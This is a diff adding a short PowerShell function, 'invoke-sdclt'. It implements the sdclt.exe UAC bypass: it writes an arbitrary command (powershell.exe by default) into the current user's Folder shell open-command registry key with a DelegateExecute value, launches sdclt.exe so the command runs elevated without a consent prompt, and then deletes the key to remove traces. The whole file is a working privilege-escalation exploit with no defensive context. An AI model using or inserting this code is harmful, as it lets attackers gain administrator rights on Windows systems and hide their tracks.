@@ -1,0 +1,25 @@
+function invoke-sdclt{ 
+    Param (    
+    $instruction = "powershell.exe" 
+        )
+
+    $path = "HKCU:\Software\Classes\Folder\shell\open\command"
+    $key = "DelegateExecute" 
+    
+    # Creating path
+    if(-not(Test-Path -Path $path))
+    {
+        New-Item $path -Force
+    
+    }
+
+    # Registry values
+    New-ItemProperty -Path $path -Name $key -Value $instruction -Force
+    Set-ItemProperty -Path $path -Name "(default)" -Value $instruction -Force
+    
+    sdclt.exe
+
+    Sleep 2
+    # Removing
+    rm -Force -Recurse "HKCU:\Software\Classes\Folder\"
+}
